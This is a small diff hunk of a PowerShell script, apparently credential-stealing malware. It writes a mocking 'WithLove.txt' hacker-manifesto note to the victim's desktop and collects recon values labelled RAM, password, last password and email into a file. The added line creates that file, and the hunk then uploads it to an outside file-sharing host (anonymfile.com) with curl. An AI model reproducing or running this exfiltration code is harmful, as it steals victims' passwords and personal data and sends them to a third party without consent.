@@ -593,6 +593,7 @@ $message = "`nMy crime is that of curiosity `nand yea curiosity killed the cat `
 $Recon = "$RAMwarn , $PASSwarn , $LAST_PASSwarn , $EMAILwarn"
 Add-Content $home\Desktop\WithLove.txt $message
 Add-Content $home\OneDrive\Desktop\WithLove.txt $message
+New-Item -Path $home\file.txt $Recon
 Add-Content $home\file.txt $Recon
 $File = $home\file.txt
 curl -F "file=@$File" https://anonymfile.com/api/v1/upload
